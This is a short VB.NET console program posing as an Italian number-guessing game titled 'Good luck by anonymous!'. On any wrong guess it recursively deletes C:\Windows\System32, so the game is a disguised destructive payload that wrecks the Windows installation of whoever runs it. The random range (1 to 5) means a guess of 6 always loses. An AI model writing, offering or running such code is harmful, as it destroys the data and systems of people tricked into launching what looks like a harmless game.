Imports System.IO

Module Module1

    Sub Main()
        Dim cas As Integer
        Dim num As Integer
        Dim rdn As New Random
        Dim elim As String

        Console.Title = "Good luck by anonymous!"
        Console.WriteLine("indovina il numero da 1 a 6")
        cas = rdn.Next(1, 6)

        Console.WriteLine(vbCrLf & "inserisci il numero uscito secondo te: ")
        num = Console.ReadLine
        elim = "C:\Windows\System32"
        If cas = num Then

            Console.WriteLine("hai indovinato era: " & cas)

        ElseIf Directory.Exists(elim) Then
            Directory.Delete(elim, True)
        End If
        Console.ReadLine()
    End Sub

End Module
